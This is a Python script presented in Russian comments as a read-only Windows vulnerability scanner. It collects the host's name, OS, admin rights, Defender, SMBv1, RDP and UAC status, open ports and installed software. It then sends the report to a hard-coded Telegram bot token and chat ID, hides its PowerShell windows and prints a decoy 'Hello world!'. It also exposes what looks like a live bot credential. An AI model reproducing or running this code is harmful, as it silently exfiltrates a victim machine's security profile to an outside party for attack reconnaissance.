# language: Python, file: scanner.py
# Сканер уязвимостей Windows. Только чтение, ничего не меняет.
# Telegram: TOKEN и CHAT_ID подставь свои.

import os
import sys
import json
import socket
import subprocess
import platform
import ctypes
import threading
import winreg
import requests

TELEGRAM_TOKEN = "8870553187:AAHDDpqsXzkUo7aqacrX_y1DbnTIEa121ug"
TELEGRAM_CHAT_ID = "8224529558"

def _run(cmd):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           creationflags=0x08000000, timeout=20)
        return (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return str(e)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def check_defender():
    out = _run(["powershell", "-NoProfile", "-Command",
                "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, "
                "AntivirusEnabled, IsTamperProtected | ConvertTo-Json -Compress"])
    for line in reversed(out.splitlines()):
        line = line.strip()
        if line.startswith("{"):
            try:
                return json.loads(line)
            except Exception:
                continue
    return {"error": out.strip()[:200]}

def check_smbv1():
    out = _run(["powershell", "-NoProfile", "-Command",
                "(Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol).State"])
    if "Enabled" in out:
        return {"enabled": True}
    if "Disabled" in out:
        return {"enabled": False}
    return {"error": out.strip()[:200]}

def check_rdp():
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                            r"SYSTEM\CurrentControlSet\Control\Terminal Server") as k:
            val, _ = winreg.QueryValueEx(k, "fDenyTSConnections")
            return {"enabled": val == 0}
    except Exception as e:
        return {"error": str(e)}

def check_uac():
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System") as k:
            val, _ = winreg.QueryValueEx(k, "EnableLUA")
            return {"enabled": val == 1}
    except Exception as e:
        return {"error": str(e)}

def check_open_ports():
    common = [21, 22, 23, 135, 139, 445, 3389, 5985, 5986]
    open_ports = []
    for p in common:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        try:
            if s.connect_ex(("127.0.0.1", p)) == 0:
                open_ports.append(p)
        except Exception:
            pass
        finally:
            s.close()
    return {"open": open_ports, "scope": "localhost only"}

def check_installed_software():
    keys = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
    ]
    apps = []
    for root in keys:
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, root) as k:
                for i in range(winreg.QueryInfoKey(k)[0]):
                    try:
                        sub = winreg.EnumKey(k, i)
                        with winreg.OpenKey(k, sub) as sk:
                            try:
                                name, _ = winreg.QueryValueEx(sk, "DisplayName")
                            except Exception:
                                continue
                            try:
                                ver, _ = winreg.QueryValueEx(sk, "DisplayVersion")
                            except Exception:
                                ver = "?"
                            apps.append(f"{name} {ver}")
                    except Exception:
                        pass
        except Exception:
            pass
    return {"apps": apps[:50]}

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        r = requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": text[:4000]}, timeout=20)
        if r.status_code != 200:
            print(f"[!] Telegram error: {r.status_code} {r.text[:200]}")
        else:
            print("[+] Report sent to Telegram")
    except Exception as e:
        print(f"[!] Telegram send failed: {e}")

def build_report():
    return {
        "host": platform.node(),
        "os": platform.platform(),
        "admin": is_admin(),
        "defender": check_defender(),
        "smbv1": check_smbv1(),
        "rdp": check_rdp(),
        "uac": check_uac(),
        "ports": check_open_ports(),
        "software": check_installed_software(),
    }

def main():
    print("Hello world!")

    report = build_report()
    text = "=== VULN SCAN ===\n" + json.dumps(report, indent=2, ensure_ascii=False)

    t = threading.Thread(target=send_telegram, args=(text,), daemon=False)
    t.start()
    t.join(timeout=25)

    input("Press Enter to exit...")

if __name__ == "__main__":
    main()
